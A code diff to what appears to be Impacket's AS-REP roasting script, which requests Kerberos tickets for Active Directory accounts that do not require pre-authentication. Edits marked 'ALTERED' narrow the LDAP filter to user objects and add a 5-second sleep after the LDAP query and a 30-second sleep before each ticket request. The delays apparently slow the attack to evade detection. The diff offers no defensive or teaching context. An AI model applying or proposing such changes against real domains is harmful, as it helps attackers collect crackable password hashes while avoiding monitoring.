@@ -30,6 +30,7 @@ from __future__ import division
 from __future__ import print_function
 import argparse
 import datetime
+import time
 import logging
 import random
 import sys
@@ -231,9 +232,9 @@ class GetUserNoPreAuth:
                 self.request_multiple_TGTs([self.__username])   
                 return
 
-        # Building the search filter
+        # Building the search filter - ALTERED the filter from computer to user. 
         searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
-                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
+                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(&(objectCategory=user)))" % \
                        (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)
 
         try:
@@ -242,6 +243,8 @@ class GetUserNoPreAuth:
                                          attributes=['sAMAccountName',
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                          sizeLimit=999)
+            # Sleep for 5 seconds after the LDAP query - ALTERED
+            time.sleep(5)
         except ldap.LDAPSearchError as e:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
                 logging.debug('sizeLimitExceeded exception caught, giving up and processing the data received')
@@ -321,6 +324,8 @@ class GetUserNoPreAuth:
             fd = None
         for username in usernames:
             try:
+                # ALTERED - Sleeping between each request
+                time.sleep(30)
                 entry = self.getTGT(username)
                 self.outputTGT(entry, fd)
             except Exception as e:
